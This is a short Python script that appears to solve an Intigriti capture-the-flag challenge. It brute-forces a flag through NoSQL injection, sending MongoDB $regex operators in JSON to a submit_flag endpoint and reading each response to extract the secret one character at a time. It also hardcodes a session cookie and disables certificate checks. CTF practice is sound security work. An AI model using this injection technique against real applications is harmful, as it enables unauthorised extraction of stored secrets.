#! /usr/bin/env python3

# https://github.com/Hex27/mongomap - failed to use :(

import requests, string
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

headers = {
    'Content-Type': 'application/json'
}

cookies = {
    'session': 'eyJ1c2VyIjp7Il9pZCI6IjVkNjJlN2M4YzFlMTQ0ZWRhNDUwMzhkOTgzMjhkM2I4IiwidXNlcm5hbWUiOiJhYWEifX0.ZVgUtg.ECDG_KROTDXm2lENamUV44qWNg4'
}

flag = ''

while True:
    for l in string.ascii_letters + string.digits + "_{}":
        data = '{"_id":"_id:3","challenge_flag":{"$regex":"^' + flag + l + '.*"}}'
#       print(data)
        data = requests.post('https://ctfc2.ctf.intigriti.io/submit_flag', data = data, headers = headers, cookies = cookies, verify=False)
#       print(data.text)
        if 'correct flag!' in data.text:
            flag += l
            print(flag)
            break
    else:
        print('Failed')
        exit(1)

# INTIGRITI{h0w_1s_7h4t_PAWSIBLE}
